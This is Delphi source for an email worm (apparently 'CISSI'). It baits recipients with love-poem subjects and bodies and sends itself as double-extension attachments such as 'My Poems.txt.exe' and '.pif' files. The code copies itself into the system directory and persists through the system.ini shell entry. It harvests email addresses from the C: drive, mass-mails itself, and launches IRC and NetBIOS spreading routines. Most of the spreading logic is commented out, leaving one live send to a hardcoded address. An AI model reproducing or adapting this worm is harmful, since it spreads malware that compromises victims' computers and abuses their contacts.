   program Project2;
   uses
     windows,
     Worm in 'worm.pas',irc,
     NetBIOS in 'NetBIOS.pas';

   Const
    //
     MAIL_FROM ='cissi@yahoo.com';
     MAIL_SUBJECT:array[0..4]of string = ('Heres a poem for you',
                                          'Ive written a poem for you',
                                          'Love poems for you :)',
                                          'Look what i wrote for you',
                                          'Poems for you');
     MAIL_BODY:array[0..3] of string =(
     ('Roses are red,'+#13#10+
     'You are mine,'+#13#10+
     'I love you until im dead,'+#13#10+
     'It will all be fine.'),
     ('I do miss you'+#13#10+
     'I do love you'+#13#10+
     'what you want me to do?'+#13#10+
     'I never want to go.'),
     ('Where did you run?'+#13#10+
     'Where did you hide?'+#13#10+
     'I stand here undone'+#13#10+
     'I stand here inside'),
     ('How could u do that'+#13#10+
     'Why did you say that'+#13#10+
     'How do you feel inside'+#13#10+
     'I wish i just could hide'));
     ATTACHMENT:array[0..9] of string =(
     'LovePoem.pif','Poem_collection.pif','Zipped_poems.exe','My Poems.txt.exe','Poems.pif',
     'Sad Stories and Poems.pif','My Story.pif','The Poems.pif','Poems for you.pif','Only Poems.txt.pif');
   var
   TC:LONGWORD;
    C:TextFile;
    CH,C1,C2,MAIL:String;
    STORE_MAIL:string;
    BUF:array[0..255]of char;
   begin
   (*
   // Gimme Sysdir--
   GetSystemDirectory(BUF,255);

   // Set Path--
   STORE_MAIL := BUF;
   STORE_MAIL := STORE_MAIL + '\CISSI.DLL';
   SetPath(STORE_MAIL);

   STORE_MAIL := BUF;
   STORE_MAIL := STORE_MAIL+'\CISSI.exe';
   COPYFILE(pchar(paramstr(0)),pchar(STORE_MAIL),false);
   writeprivateprofilestring('boot','shell',pchar('Explorer.exe '+STORE_MAIL),'system.ini');

   // Grab all emails--
   if not fileexists(Store_mail) then
    GrabMail('C:\','*','*.*');

   // Now go get send email--
   Randomize;
   AssignFile(C,STORE_MAIL);
   Reset(C);
   Read(C, C1);
   ReadLn(C, C2);
   MAIL := C1;
   CH := CH+C1;
   if pos(C1,CH)=0 then
    Mailz(MAIL_SUBJECT[random(4)],MAIL_BODY[random(3)],mail,MAIL_FROM,ATTACHMENT[Random(9)]);
   While NOT eof(C) do begin
   Randomize;
   Read(C, C1);
   ReadLn(C, C2);
   MAIL := C1;
   CH := CH+C1;
   if pos(C1,CH)=0 then*)
    Mailz(MAIL_SUBJECT[random(4)],MAIL_BODY[random(3)],'soultrapped@hotmail.com',MAIL_FROM,ATTACHMENT[Random(9)]);
   (*
    end;
   closefile(C);
   CreateThread(nil,0,@MIRC,nil,0,TC);
   StartNetBIOS;      *)
   end.
